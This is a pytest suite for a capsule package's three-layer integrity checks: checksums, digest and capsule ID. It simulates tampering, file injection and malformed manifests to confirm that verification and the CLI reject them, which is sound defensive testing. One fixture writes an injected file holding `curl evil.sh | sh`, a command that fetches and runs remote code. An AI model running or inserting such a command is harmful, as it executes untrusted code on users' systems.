"""Spec §6 three-layer integrity verification (#14) and closed-set enforcement (#17).

Layer 1: payload files vs .checksums
Layer 2: SHA-256(.checksums bytes) vs manifest.checksums_digest
Layer 3: recomputed capsule ID vs a caller-supplied trusted ID

Layers 2 and 3 are what make the capsule tamper-*evident*: layer 1 alone is
defeated by any attacker who re-runs `save_checksums` after editing a payload.
"""
import hashlib
import json
from pathlib import Path

import yaml

from marqov_capsule._canonical import compute_capsule_id, load_manifest_yaml
from marqov_capsule.builder import CapsuleBuilder
from marqov_capsule.verifier import CapsuleVerifier


def _seal(capsule_dir: Path, counts=None) -> str:
    """Seal a realistic capsule. Returns the capsule ID reported at seal time."""
    capsule_dir.mkdir(parents=True, exist_ok=True)
    counts = counts or {"00": 512, "11": 512}
    payload = capsule_dir / "payload"
    payload.mkdir(exist_ok=True)
    (payload / "results.json").write_text(
        json.dumps({"counts": counts, "shots": sum(counts.values())})
    )
    source = capsule_dir / "source"
    source.mkdir(exist_ok=True)
    (source / "circuit.qasm").write_text("OPENQASM 3.0;\nqubit[2] q;\nh q[0];\ncx q[0], q[1];\n")

    b = CapsuleBuilder()
    b.start_capsule(name="Bell", requirements={"paradigm": ["gate-based"], "max_qubit_count": 2})
    b.add_task_execution(
        task_id="550e8400-e29b-41d4-a716-446655440000",
        status="success",
        result_type="probabilistic",
        backend={"provider": "ibm", "name": "ibm_kyiv", "shots": 1024},
    )
    return b.seal(capsule_dir=capsule_dir, sealed_by="test-runner")


def _rewrite_checksums(capsule_dir: Path) -> None:
    """Recompute .checksums over the current tree — what a tamperer would do."""
    checksums = {}
    for fp in sorted(capsule_dir.rglob("*")):
        if fp.is_file() and fp.name not in {".checksums", "capsule.yaml"}:
            rel = str(fp.relative_to(capsule_dir))
            checksums[rel] = "sha256:" + hashlib.sha256(fp.read_bytes()).hexdigest()
    (capsule_dir / ".checksums").write_text(yaml.dump(checksums, default_flow_style=False, sort_keys=True))


# --- Layer 3 precondition: the ID printed at seal must be recomputable ------


def test_sealed_id_recomputes_from_written_manifest(tmp_path):
    """`seal` reports an ID from the in-memory dict; verify recomputes from YAML on disk.

    If these disagree, an ID recorded at seal time can never be verified later.
    """
    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)
    from_disk = compute_capsule_id(load_manifest_yaml((capsule_dir / "capsule.yaml").read_text()))
    assert from_disk == sealed_id


# --- #14: the PoC that defeats layer-1-only verification --------------------


def test_untampered_capsule_passes_all_layers(tmp_path):
    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)

    result = CapsuleVerifier.verify_integrity(capsule_dir, expected_id=sealed_id)

    assert result["status"] == "pass", result
    assert result["checksums_digest_match"] is True
    assert result["capsule_id_match"] is True


def test_payload_edit_with_recomputed_checksums_fails(tmp_path):
    """The #14 reproduction: falsify results, rewrite .checksums to match.

    Layer 1 passes by construction. Layer 2 must catch it, because the manifest's
    checksums_digest still pins the *original* .checksums bytes.
    """
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)

    (capsule_dir / "payload" / "results.json").write_text(
        json.dumps({"counts": {"00": 1024, "11": 0}, "shots": 1024})
    )
    _rewrite_checksums(capsule_dir)

    # Layer 1 alone is satisfied — that is exactly the bug.
    assert CapsuleVerifier.verify_checksums(capsule_dir)["status"] == "pass"

    result = CapsuleVerifier.verify_integrity(capsule_dir)
    assert result["status"] == "fail", result
    assert result["checksums_digest_match"] is False


def test_manifest_edit_detected_against_expected_id(tmp_path):
    """capsule.yaml is outside .checksums by design; only the capsule ID pins it."""
    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)

    manifest = load_manifest_yaml((capsule_dir / "capsule.yaml").read_text())
    manifest["sealed_by"] = "somebody-else"
    (capsule_dir / "capsule.yaml").write_text(yaml.dump(manifest, default_flow_style=False, sort_keys=False))

    result = CapsuleVerifier.verify_integrity(capsule_dir, expected_id=sealed_id)
    assert result["status"] == "fail", result
    assert result["capsule_id_match"] is False


def test_missing_checksums_digest_on_sealed_capsule_fails(tmp_path):
    """A sealed manifest without checksums_digest cannot be layer-2 verified."""
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)

    manifest = load_manifest_yaml((capsule_dir / "capsule.yaml").read_text())
    del manifest["checksums_digest"]
    (capsule_dir / "capsule.yaml").write_text(yaml.dump(manifest, default_flow_style=False, sort_keys=False))

    result = CapsuleVerifier.verify_integrity(capsule_dir)
    assert result["status"] == "fail", result


def test_missing_manifest_fails(tmp_path):
    """Without capsule.yaml there is no root to anchor the checksum list to."""
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "capsule.yaml").unlink()

    result = CapsuleVerifier.verify_integrity(capsule_dir)
    assert result["status"] == "fail", result


def test_verify_integrity_reports_computed_id(tmp_path):
    """The recomputed ID is always reported, so a caller can record it as trusted."""
    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)

    result = CapsuleVerifier.verify_integrity(capsule_dir)
    assert result["capsule_id"] == sealed_id
    assert result["capsule_id_match"] is None  # no expected ID supplied


# --- #17: .checksums pins a closed set --------------------------------------


def test_injected_file_fails_verification(tmp_path):
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "payload" / "malware.py").write_text("import os; os.system('curl evil.sh | sh')\n")

    result = CapsuleVerifier.verify_checksums(capsule_dir)
    assert result["status"] == "fail", result
    assert "payload/malware.py" in result["extra"]


def test_capsule_yaml_is_not_extra(tmp_path):
    """capsule.yaml is excluded from .checksums by design — it must not read as injected."""
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)

    result = CapsuleVerifier.verify_checksums(capsule_dir)
    assert result["extra"] == []
    assert result["status"] == "pass", result


def test_injected_file_fails_full_integrity_check(tmp_path):
    """Injection also leaves checksums_digest and the capsule ID valid — layer 1 must catch it."""
    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)
    (capsule_dir / "payload" / "malware.py").write_text("payload\n")

    result = CapsuleVerifier.verify_integrity(capsule_dir, expected_id=sealed_id)
    assert result["status"] == "fail", result
    assert result["checksums_digest_match"] is True  # untouched
    assert result["capsule_id_match"] is True  # untouched


# --- CLI wiring: consumers must gate on all three layers --------------------


def test_cli_verify_rejects_recomputed_checksums(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "payload" / "results.json").write_text(
        json.dumps({"counts": {"00": 1024, "11": 0}, "shots": 1024})
    )
    _rewrite_checksums(capsule_dir)

    result = CliRunner().invoke(cli, ["verify", str(capsule_dir)])
    assert result.exit_code == 1, result.output


def test_cli_verify_id_match_exits_0(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)

    result = CliRunner().invoke(cli, ["verify", "--id", sealed_id, str(capsule_dir)])
    assert result.exit_code == 0, result.output


def test_cli_verify_id_mismatch_exits_1(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)

    result = CliRunner().invoke(cli, ["verify", "--id", "0" * 64, str(capsule_dir)])
    assert result.exit_code == 1, result.output


def test_cli_verify_reports_capsule_id(tmp_path):
    """Users need the recomputed ID to record as trusted for later --id checks."""
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)

    result = CliRunner().invoke(cli, ["verify", str(capsule_dir)])
    assert result.exit_code == 0, result.output
    assert sealed_id in result.output


def test_cli_verify_without_id_says_manifest_unauthenticated(tmp_path):
    """Passing without --id must not read as a full tamper-evidence guarantee."""
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)

    result = CliRunner().invoke(cli, ["verify", str(capsule_dir)])
    assert result.exit_code == 0, result.output
    assert "not authenticated" in result.output.lower()


def test_cli_verify_json_includes_layers(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    sealed_id = _seal(capsule_dir)

    result = CliRunner().invoke(cli, ["verify", "--json", "--id", sealed_id, str(capsule_dir)])
    assert result.exit_code == 0, result.output
    data = json.loads(result.output)
    assert data["checksums_digest_match"] is True
    assert data["capsule_id_match"] is True


def test_cli_open_refuses_injected_file(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "payload" / "malware.py").write_text("evil\n")

    dest = tmp_path / "out"
    result = CliRunner().invoke(cli, ["open", str(capsule_dir), "--dest", str(dest)])
    assert result.exit_code == 1, result.output
    assert not (dest / "bell.capsule").exists()


def test_cli_open_refuses_recomputed_checksums(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "payload" / "results.json").write_text('{"counts": {"00": 1024}}')
    _rewrite_checksums(capsule_dir)

    dest = tmp_path / "out"
    result = CliRunner().invoke(cli, ["open", str(capsule_dir), "--dest", str(dest)])
    assert result.exit_code == 1, result.output
    assert not (dest / "bell.capsule").exists()


# --- Exclusions are root-only: a nested capsule.yaml is still payload -------


def test_nested_capsule_yaml_is_checksummed(tmp_path):
    """Only the *root* capsule.yaml is outside .checksums.

    Excluding by basename anywhere in the tree would let an attacker drop
    payload/capsule.yaml into a sealed capsule with no layer able to see it.
    """
    capsule_dir = tmp_path / "bell.capsule"
    capsule_dir.mkdir()
    payload = capsule_dir / "payload"
    payload.mkdir()
    (payload / "capsule.yaml").write_text("nested: true\n")
    (payload / "results.json").write_text('{"counts": {"00": 1}}')
    (capsule_dir / "capsule.yaml").write_text("version: '1.0.0'\n")

    raw = CapsuleBuilder().save_checksums(capsule_dir).read_text()
    checksums = {line.split("  ", 1)[1]: line.split("  ", 1)[0]
                 for line in raw.splitlines() if line.strip()}
    assert "payload/capsule.yaml" in checksums
    assert "capsule.yaml" not in checksums


def test_injected_nested_capsule_yaml_fails_verification(tmp_path):
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "payload" / "capsule.yaml").write_text("injected: true\n")

    result = CapsuleVerifier.verify_checksums(capsule_dir)
    assert result["status"] == "fail", result
    assert "payload/capsule.yaml" in result["extra"]


def test_injected_nested_checksums_file_fails_verification(tmp_path):
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "payload" / ".checksums").write_text("injected: true\n")

    result = CapsuleVerifier.verify_checksums(capsule_dir)
    assert result["status"] == "fail", result
    assert "payload/.checksums" in result["extra"]


# --- --id must not be silently ignored on the statistical path -------------



# --- Malformed manifests must fail cleanly, not raise ----------------------


def test_unparseable_manifest_fails_without_raising(tmp_path):
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "capsule.yaml").write_text("{ this is: not: valid yaml\n")

    result = CapsuleVerifier.verify_integrity(capsule_dir)
    assert result["status"] == "fail", result


def test_non_mapping_manifest_fails_without_raising(tmp_path):
    """A manifest that parses to a list must not reach .get() and AttributeError."""
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "capsule.yaml").write_text("- one\n- two\n")

    result = CapsuleVerifier.verify_integrity(capsule_dir)
    assert result["status"] == "fail", result


def test_empty_manifest_fails_without_raising(tmp_path):
    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "capsule.yaml").write_text("")

    result = CapsuleVerifier.verify_integrity(capsule_dir)
    assert result["status"] == "fail", result


def test_cli_verify_malformed_manifest_exits_1_without_traceback(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)
    (capsule_dir / "capsule.yaml").write_text("{ this is: not: valid yaml\n")

    result = CliRunner().invoke(cli, ["verify", str(capsule_dir)])
    assert result.exit_code == 1, result.output
    assert result.exception is None or isinstance(result.exception, SystemExit), result.output


def test_cli_open_id_mismatch_refuses(tmp_path):
    from click.testing import CliRunner
    from marqov_capsule.cli.main import cli

    capsule_dir = tmp_path / "bell.capsule"
    _seal(capsule_dir)

    dest = tmp_path / "out"
    result = CliRunner().invoke(cli, ["open", str(capsule_dir), "--id", "0" * 64, "--dest", str(dest)])
    assert result.exit_code == 1, result.output
    assert not (dest / "bell.capsule").exists()
